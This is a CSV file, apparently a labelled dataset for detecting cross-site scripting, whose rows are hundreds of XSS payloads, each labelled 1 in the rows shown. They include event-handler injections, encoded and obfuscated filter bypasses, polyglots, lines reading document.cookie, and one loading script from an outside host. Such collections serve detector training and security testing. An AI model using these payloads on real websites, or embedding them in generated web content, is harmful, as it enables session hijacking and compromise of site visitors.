payload,xss
嘼嘾img%20src%3Dx%20onerror%3Dprompt%28document.domain%29%3B%3E,1
"<frameset draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</frameset>",1
<meter onpointermove=alert(1) style=display:block>AnonKryptiQuz</meter>,1
"""><img src=x&#9;onerror=prompt(document.domain);>",1
<samp id=x tabindex=1 onactivate=alert(1)></samp>,1
"<style>:target {transform: rotate(180deg);}</style><template id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></template>",1
<blink onbeforescriptexecute=alert(1)><script>1</script>,1
"<input onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</input>",1
\<a onmouseover=alert(document.cookie)\>xxs link\</a\>,1
"<acronym onclick=""alert(1)"">AnonKryptiQuz</acronym>",1
"<sub onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</sub>",1
"<hr draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</hr>",1
"<menu oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</menu>",1
"<sub onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</sub>",1
<content onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</content><input value=clickme>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><caption id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></caption>",1
<dfn onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</dfn><input value=clickme>,1
"<legend draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</legend>",1
"<keygen onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</keygen>",1
<data id=x tabindex=1 onfocus=alert(1)></data>,1
"<dd onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</dd>",1
"<keygen onclick=""alert(1)"">AnonKryptiQuz</keygen>",1
"<bgsound ondblclick=""alert(1)"">AnonKryptiQuz</bgsound>",1
<svg/onload​=alert//&NewLine;(2)>,1
<area onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</area><input value=clickme>,1
"<li onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</li>",1
"<style>:target {transform: rotate(180deg);}</style><td id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></td>",1
<image onmousewheel=alert(1) style=display:block>requires scrolling,1
<colgroup onpointerover=alert(1) style=display:block>AnonKryptiQuz</colgroup>,1
"<slot draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</slot>",1
<ins onpointerup=alert(1) style=display:block>AnonKryptiQuz</ins>,1
"<style>@keyframes x{}</style><figcaption style=""animation-name:x"" onwebkitanimationend=""alert(1)""></figcaption>",1
"<template oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
<--`<img%2fsrc%3d` onerror%3dalert(document.domain)> --!>,1
<input onpointerup=alert(1) style=display:block>AnonKryptiQuz</input>,1
"<tfoot onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</tfoot>",1
<menuitem onpointerover=alert(1) style=display:block>AnonKryptiQuz</menuitem>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><menuitem id=x style=""position:absolute;"" onanimationcancel=""print()""></menuitem>",1
"<blink draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</blink>",1
"<applet oncontextmenu=""alert(1)"">AnonKryptiQuz</applet>",1
"<svg draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</svg>",1
<img/src/onerror=prompt(8)>,1
<svg><path><animateMotion onend=alert(1) dur=1s repeatCount=1>,1
"<IMG SRC=x onmousedown=""alert(String.fromCharCode(88,83,83))"">",1
"<tt ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</tt>",1
""";(a=alert,b=1,a(b))",1
"jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e",1
"<object+data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""></object>",1
"<source onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</source>",1
"sg7cx""%20onerror%3d""confirm(document.domain)""gd67e",1
<strike onafterscriptexecute=alert(1)><script>1</script>,1
"<svg oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
"<meta HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:document.vulnerable=true;"">",1
"<a class=bar href=""http://www.example.org"">www.example.org</a>",1
[color=red width=expression(alert(123))][color],1
<ruby onafterscriptexecute=alert(1)><script>1</script>,1
"<param draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</param>",1
<html onpointermove=alert(1) style=display:block>AnonKryptiQuz</html>,1
"<svg id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></svg>",1
(alert)(1),1
"<style>@keyframes x{}</style><button style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></button>",1
<br onmousewheel=alert(1) style=display:block>requires scrolling,1
"<div style=""font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);"">X",1
<body ontouchstart=alert(1)>,1
"<image3 onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</image3>",1
"<textarea oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
"<style>:target {transform: rotate(180deg);}</style><textarea id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></textarea>",1
<header id=x tabindex=1 onfocusin=alert(1)></header>,1
"<img2 onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></img2>",1
"')}, 1000); alert('AnonKryptiQuz')://",1
<title onafterscriptexecute=alert(1)><script>1</script>,1
"<hr onmouseenter=""alert(1)"">AnonKryptiQuz</hr>",1
"<object draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</object>",1
<header id=x tabindex=1 onbeforeactivate=alert(1)></header>,1
"<plaintext onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</plaintext>",1
"<big onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</big>",1
"<keygen onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</keygen>",1
"<style>:target {color: red;}</style><ins id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></ins>",1
"<audio ondblclick=""alert(1)"">AnonKryptiQuz</audio>",1
"<p oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</p>",1
"<link onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</link>",1
"<head onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></head>",1
<div style=xss:expression(1)-alert(1)>,1
"<abbr draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</abbr>",1
<blink id=x tabindex=1 onactivate=alert(1)></blink>,1
"<var onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</var>",1
"<IFRAME SRC=""javascript:alert(document.cookie);""></IFRAME>",1
<hgroup onblur=alert(1) tabindex=1 id=x></hgroup><input autofocus>,1
"<div draggable=""true"" contenteditable>drag me</div><meter ondrop=alert(1) contenteditable>drop here</meter>",1
"<basefont onmouseenter=""alert(1)"">AnonKryptiQuz</basefont>",1
"<noscript onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</noscript>",1
"<article onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</article>",1
image src\r\n=valid.jpg onloadend='new class extends (co\u006efir\u006d)/**/`` &lcub;&rcub;'>,1
<span onbeforescriptexecute=alert(1)><script>1</script>,1
<script\x0C>javascript:alert(1)</script>,1
"<embed onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</embed>",1
"<command oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
"<div draggable=""true"" contenteditable>drag me</div><set ondrop=alert(1) contenteditable style=display:block>drop here</set>",1
<IMG SRC=”javascript:alert(‘AnonKryptiQuz’)”,1
<rtc onafterscriptexecute=alert(1)><script>1</script>,1
<mark onafterscriptexecute=alert(1)><script>1</script>,1
"<a target=""x"" href=""xssme?xss=<script>find('cookie'); var doc = getSelection().getRangeAt(0).startContainer.ownerDocument; console.log(doc); var xpe = new XPathEvaluator(); var nsResolver = xpe.createNSResolver(doc); var result = xpe.evaluate('//script/text()', doc, nsResolver, 0, null); alert(result.iterateNext().data.match(/cookie = '(.*?)'/)[1])</script>",1
"<data oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
"<meter onmouseup=""alert(1)"">AnonKryptiQuz</meter>",1
"<iframe2 draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</iframe2>",1
<frame onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</frame><input value=clickme>,1
"<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">",1
<acronym onbeforescriptexecute=alert(1)><script>1</script>,1
"<style>@keyframes slidein {}</style><data style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></data>",1
<head onpointerdown=alert(1) style=display:block>AnonKryptiQuz</head>,1
"<style>@keyframes slidein {}</style><embed style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></embed>",1
"""><ImG%20sRc=x%20onErroR=prompt`AnonKryptiQuz`>",1
<strike onmousewheel=alert(1) style=display:block>requires scrolling,1
<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>,1
"<style>@keyframes slidein {}</style><slot style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></slot>",1
<aside onpointerover=alert(1) style=display:block>AnonKryptiQuz</aside>,1
"""/><svg/onload=prompt(1)>",1
<svg/onrandom=random onload=confirm(1)>,1
"<img src=x onerror=""eval('\141lert(1)')""/>",1
&lt;SCRIPT a=&quot;blah&quot; &apos;&apos; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,1
<dd onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</dd><input value=clickme>,1
"<nextid oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
\xE2\x81\x9Fjavascript:javascript:confirm(1),1
"<picture onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</picture>",1
"<style>@keyframes x{}</style><acronym style=""animation-name:x"" onwebkitanimationend=""alert(1)""></acronym>",1
"<style>:target {color: red;}</style><element id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></element>",1
<animate onpointerout=alert(1) style=display:block>AnonKryptiQuz</animate>,1
"""><img src=x onerror=prompt('document.domain');>.asp",1
"<svg><script href=data:,alert(1) />(",1
<meta onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</meta><input value=clickme>,1
"<font draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</font>",1
"<head draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</head>",1
"<col onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</col>",1
%3balert`AnonKryptiQuz`%3b,1
<animatetransform onbeforescriptexecute=alert(1)><script>1</script>,1
<script\x00>javascript:alert(1)</script>,1
<wbr onpointerenter=alert(1) style=display:block>AnonKryptiQuz</wbr>,1
"<dfn oncontextmenu=""alert(1)"">AnonKryptiQuz</dfn>",1
<big onfocusout=alert(1) tabindex=1 id=x></big><input autofocus>,1
"<tr onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</tr>",1
"<multicol onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</multicol>",1
<button popovertarget=x>Click me</button><meta onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</meta>,1
"<style>:target {color: red;}</style><button id=x style=""transition:color 10s"" ontransitioncancel=print()></button>",1
"""&lt;img src=1 onerror=alert(1)&gt;",1
"<IMG SRC=""livescript:[code]"">",1
<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />,1
"<style>:target {color:red;}</style><picture id=x style=""transition:color 1s"" ontransitionstart=alert(1)></picture>",1
"<script>import('data:text/javascript,alert(1)')</script>",1
"<style>:target {transform: rotate(180deg);}</style><kbd id=x style=""transition:transform 2s"" ontransitionrun=print()></kbd>",1
<animatemotion onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</animatemotion><input value=clickme>,1
"<iframe src=%22404%22 onload=%22content.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>",1
"<style>:target {transform: rotate(180deg);}</style><output id=x style=""transition:transform 2s"" ontransitionrun=print()></output>",1
"<style>@keyframes x{}</style><article style=""animation-name:x"" onwebkitanimationend=""alert(1)""></article>",1
"<style>@keyframes slidein {}</style><custom tags style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></custom tags>",1
<bdi onpointerdown=alert(1) style=display:block>AnonKryptiQuz</bdi>,1
<dir id=x tabindex=1 onfocus=alert(1)></dir>,1
"<hr draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</hr>",1
"<IMG+SRC=""jav#x0D;ascript:alert(1);"">",1
<strike id=x tabindex=1 onactivate=alert(1)></strike>,1
3Cscript%3Ealert(1)%3C%2Fscript%3E,1
"<keygen onmouseenter=""alert(1)"">AnonKryptiQuz</keygen>",1
"<sCrIpt/""<a""/srC=data:="".<a,[8].some(confirm)>",1
"«input»; p=-alert(1)}//\ $result* var n = {a: ""-alert(1)}//\"", b: ""-alert(1)}//\""};",1
"<video onmouseover=""alert(1)"">AnonKryptiQuz</video>",1
"<br onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</br>",1
"<div draggable=""true"" contenteditable>drag me</div><pre ondrop=alert(1) contenteditable style=display:block>drop here</pre>",1
"<form draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</form>",1
"<style>:target {transform: rotate(180deg);}</style><caption id=x style=""transition:transform 2s"" ontransitionrun=print()></caption>",1
<textarea onbeforescriptexecute=alert(1)><script>1</script>,1
"<head onmousedown=""alert(1)"">AnonKryptiQuz</head>",1
"<nav ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</nav>",1
<a onpointerover=alert(1) style=display:block>AnonKryptiQuz</a>,1
"b=\""URL(\\""\"";",1
"<menu draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</menu>",1
"<area oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
"<menuitem onmouseup=""alert(1)"">AnonKryptiQuz</menuitem>",1
"&lt;BR SIZE=\""&{alert('AnonKryptiQuz')}\""&gt;",1
'onfocus='alert(1)' autofocus=',1
"<article onmousemove=""alert(1)"">AnonKryptiQuz</article>",1
"<content onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</content>",1
javascript&colon;alert(1);,1
<listing onpointerout=alert(1) style=display:block>AnonKryptiQuz</listing>,1
"<IMG SRC=x onscroll=""alert(String.fromCharCode(88,83,83))"">",1
"<style>@keyframes slidein {}</style><input2 style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></input2>",1
<rb id=x tabindex=1 onactivate=alert(1)></rb>,1
"<font onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</font>",1
"<style>:target {color:red;}</style><html id=x style=""transition:color 1s"" ontransitionstart=alert(1)></html>",1
"<isindex draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</isindex>",1
"<img src=x onerror=""alert(origin)"">",1
"<script draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</script>",1
"<image draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</image>",1
"<style>:target {color:red;}</style><applet id=x style=""transition:color 1s"" ontransitionend=alert(1)></applet>",1
"<style>@keyframes x{}</style><nav style=""animation-name:x"" onanimationstart=""alert(1)""></nav>",1
"'/*\'/*""/*\""/*`/*\`/*%26apos;)/*<!-->",1
"<object draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</object>",1
<option onpointerup=alert(1) style=display:block>AnonKryptiQuz</option>,1
+ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-,1
"<meter onmouseover=""alert(1)""",1
"<style>@keyframes x{}</style><element style=""animation-name:x"" onanimationstart=""alert(1)""></element>",1
/%09/javascript:alert(1);,1
"<style>:target {transform: rotate(180deg);}</style><output id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></output>",1
<span onfocusout=alert(1) tabindex=1 id=x></span><input autofocus>,1
"<del onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</del>",1
<img2 onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</img2><input value=clickme>,1
"<label onmouseout=""alert(1)"">AnonKryptiQuz</label>",1
<param onpointermove=alert(1) style=display:block>AnonKryptiQuz</param>,1
"<applet draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</applet>",1
<big onpointerdown=alert(1) style=display:block>AnonKryptiQuz</big>,1
"<style>:target {color: red;}</style><noscript id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></noscript>",1
<slot id=x tabindex=1 onbeforedeactivate=alert(1)></slot><input autofocus>,1
"a=8,b=confirm,c=window,c.onerror=b;throw-a",1
<body onorientationchange=alert(1)>,1
"<form><button formaction=""javascript:alert(123)"">crosssitespt",1
<font onfocusout=alert(1) tabindex=1 id=x></font><input autofocus>,1
</script><script >alert(document.cookie)</script>,1
"xss=*/prompt(""AnonKryptiQuz"")/*&",1
"<img src=""mocha:document.vulnerable=true;"">",1
"<td id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></td>",1
<plaintext onpointerenter=alert(1) style=display:block>AnonKryptiQuz</plaintext>,1
"<area draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</area>",1
"<a onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</a>",1
"<html onmouseup=""alert(1)"">AnonKryptiQuz</html>",1
"<div draggable=""true"" contenteditable>drag me</div><tbody ondragover=alert(1) contenteditable style=display:block>drop here</tbody>",1
"<style>@keyframes slidein {}</style><cite style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></cite>",1
"1'""();<AnonKryptiQuz><ScRiPt>alert(""AnonKryptiQuz"")</ScRiPt>",1
<pre onblur=alert(1) tabindex=1 id=x></pre><input autofocus>,1
